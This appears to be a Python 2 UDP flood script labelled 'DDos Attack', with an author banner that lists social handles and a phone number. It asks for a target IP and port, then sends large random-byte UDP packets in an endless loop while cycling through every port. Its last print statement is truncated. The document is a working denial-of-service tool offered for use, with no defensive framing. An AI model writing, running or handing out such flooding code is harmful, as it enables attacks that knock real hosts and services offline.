
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
time.sleep(1)
os.system("figlet DDos Attack")
print ("\033[1;36m=======================================")

time.sleep(1)
print ("\033[1;36mAuthor \033[1;32m: \033[1;35mDicky Andre")
print ("\033[1;36mYutube \033[1;32m: \033[1;35mMR VIRUS SPM")
print ("\033[1;36mGithub \033[1;32m: \033[1;35mhttps://github.com/MrVirusSpm-07")
print ("\033[1;36mWhasap \033[1;32m: \033[1;35m+6281574614665")

time.sleep(1)
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack")
time.sleep(1)
print "[menyerang........] 1% "
time.sleep(1)
print "[menyerang........] 2%"
time.sleep(1)
print "[menyerang........] 3%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,por>
     if port == 65534:
       port = 1
